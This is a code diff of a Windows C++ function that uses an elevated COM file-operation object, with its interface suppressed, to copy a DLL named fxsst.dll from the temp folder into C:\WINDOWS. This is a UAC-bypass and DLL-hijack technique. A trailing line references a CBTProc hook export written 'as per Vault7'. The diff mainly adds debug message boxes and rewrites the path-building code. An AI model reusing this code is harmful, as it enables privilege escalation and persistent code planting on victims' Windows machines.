@@ -100,12 +100,14 @@ void ElevatedCopy()
     HRESULT hr = CoInitializeEx(NULL, COINIT_APARTMENTTHREADED | COINIT_DISABLE_OLE1DDE);
     if (FAILED(hr))
     {
+        MessageBox(NULL, L"Failed to initialize COM library", L"Error", MB_OK);
         return;
     }
     IFileOperation* pfo;
     hr = CoCreateInstanceAsAdmin(NULL, CLSID_FileOperation, IID_PPV_ARGS(&pfo));
     if (FAILED(hr))
     {
+        MessageBox(NULL, L"Failed to create IFileOperation instance", L"Error", MB_OK);
         return;
     }
     pfo->SetOperationFlags(FOF_NO_UI);
@@ -113,41 +115,27 @@ void ElevatedCopy()
     // Get the %TEMP% directory
     wchar_t szTempDir[MAX_PATH];
     GetTempPathW(MAX_PATH, szTempDir);
+    // Get the long form of the path name
     wchar_t szLongTempDir[MAX_PATH];
     GetLongPathNameW(szTempDir, szLongTempDir, MAX_PATH);
-    int numBackslashes = 0;
-    for (int i = 0; szLongTempDir[i] != '\0'; i++)
-    {
-        if (szLongTempDir[i] == '\\')
-        {
-            numBackslashes++;
-        }
-    }
-    size_t len = wcslen(szLongTempDir) + numBackslashes + wcslen(L"\\fxsst.dll") + 1;
+    // Calculate the length of the new string
+    size_t len = wcslen(szLongTempDir) + wcslen(L"fxsst.dll") + 1; // +1 for null terminator
+    // Allocate memory for the new string
     wchar_t* szFxsstDllPath = new wchar_t[len];
-    int j = 0;
-    for (int i = 0; szLongTempDir[i] != '\0'; i++)
-    {
-        if (szLongTempDir[i] == '\\')
-        {
-            szFxsstDllPath[j++] = '\\';
-            szFxsstDllPath[j++] = '\\';
-        }
-        else
-        {
-            szFxsstDllPath[j++] = szLongTempDir[i];
-        }
-    }
-    // the above steps are necessary to escape slashes and get the long form path for SHCreateItemFromParsingName.
-    wcscat_s(szFxsstDllPath, len, L"\\fxsst.dll");
+    // Build the full path for the DLL
+    wcscpy_s(szFxsstDllPath, len - 1, szLongTempDir);
+    wcscat_s(szFxsstDllPath, len, L"fxsst.dll");
+    MessageBox(NULL, szFxsstDllPath, L"dll", MB_OK);
     hr = SHCreateItemFromParsingName(szFxsstDllPath, NULL, IID_PPV_ARGS(&from));
     if (FAILED(hr))
     {
+        MessageBox(NULL, L"Failed to create IShellItem from parsing name", L"Error", MB_OK);
         return;
     }
     hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\", NULL, IID_PPV_ARGS(&to));
     if (FAILED(hr))
     {
+        MessageBox(NULL, L"Failed to create IShellItem from parsing name", L"Error", MB_OK);
         return;
     }
     pfo->CopyItem(from, to, L"fxsst.dll", NULL);
@@ -155,11 +143,10 @@ void ElevatedCopy()
     from->Release();
     to->Release();
     pfo->Release();
-    if(szFxsstDllPath)
+    if (szFxsstDllPath)
         delete[] szFxsstDllPath;
     CoUninitialize();
 }
-
 extern "C" __declspec(dllexport) LRESULT CALLBACK CBTProc(int nCode, WPARAM wParam, LPARAM lParam)
 {
     // increase the DLL reference counter to stop unloading as per Vault7
